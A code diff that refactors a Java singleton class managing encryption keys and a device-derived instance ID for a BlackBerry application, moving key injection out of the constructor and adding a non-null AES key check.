@@ -14,7 +14,7 @@ import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.Singleton;
-
+import blackberry.utils.Check;
 
 /**
  * The Class Keys.
@@ -30,13 +30,11 @@ public final class Keys implements Singleton {
     static private Keys instance = null;
     private static final long GUID = 0x6b3d91c714d645e7L;
 
-   /* private static byte[] byteAesKey;
-    private static byte[] byteChallengeKey;
-    private static byte[] byteConfKey;
-    private static byte[] byteBuildID;
-    */
+    /*
+     * private static byte[] byteAesKey; private static byte[] byteChallengeKey;
+     * private static byte[] byteConfKey; private static byte[] byteBuildID;
+     */
     private static byte[] byteInstanceID;
-    
 
     //#ifdef DEBUG
     public String log = "";
@@ -48,23 +46,33 @@ public final class Keys implements Singleton {
      * 
      * @return single instance of Keys
      */
-    public static synchronized Keys getInstance(InstanceKeysEmbedded instanceKeyEmbedded) {
+    public static synchronized Keys getInstance(
+            InstanceKeysEmbedded instanceKeyEmbedded) {
         if (instance == null) {
 
             instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
             if (instance == null) {
-                final Keys singleton = new Keys(instanceKeyEmbedded);
+                final Keys singleton = new Keys();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
             }
         }
+        //#ifdef FAKECONF
+        if (instanceKeyEmbedded != null) {
+            instance.setInstanceKeys(instanceKeyEmbedded);
+        }
+        //#endif
+
+        //#ifdef DBC
+        Check.ensures(instance.getAesKey() != null, "Null AESKEY");
+        //#endif
+        
         return instance;
     }
-    
+
     public static synchronized Keys getInstance() {
         return getInstance(null);
     }
-
 
     public static synchronized boolean isInstanced() {
         return (instance != null);
@@ -79,39 +87,31 @@ public final class Keys implements Singleton {
         return instanceKeys.hasBeenBinaryPatched();
     }
 
-    private Keys(){
-        this(null);
-    }
-    
-    private Keys(InstanceKeysEmbedded instance) {
-        instanceKeys = new InstanceKeys();
+    private Keys() {
         final Device device = Device.getInstance();
         //device.refreshData();
         final byte[] deviceid = device.getWDeviceId();
         byteInstanceID = Encryption.SHA1(deviceid);
+    }
 
+    private void setInstanceKeys(InstanceKeysEmbedded instance) {
+        instanceKeys = new InstanceKeys();
         //#ifdef FAKECONF
         if (!hasBeenBinaryPatched()) {
-            if(instance!=null){
+            if (instance != null) {
                 instance.injectKeys(instanceKeys);
             }
         }
         //#endif  
-        
-        //setInstanceKeys();
     }
 
-  /*  private void setInstanceKeys() {
-
-        byteAesKey = instanceKeys.getAesKey();
-        byteChallengeKey = instanceKeys.getChallengeKey();
-        byteConfKey = instanceKeys.getConfKey();
-        byteBuildID = instanceKeys.getBuildId();
-
-        //#ifdef DEBUG
-        debug.trace("instanceKeys log:" + InstanceKeys.log);
-        //#endif
-    }*/
+    /*
+     * private void setInstanceKeys() { byteAesKey = instanceKeys.getAesKey();
+     * byteChallengeKey = instanceKeys.getChallengeKey(); byteConfKey =
+     * instanceKeys.getConfKey(); byteBuildID = instanceKeys.getBuildId();
+     * //#ifdef DEBUG debug.trace("instanceKeys log:" + InstanceKeys.log);
+     * //#endif }
+     */
 
     /**
      * Gets the aes key.
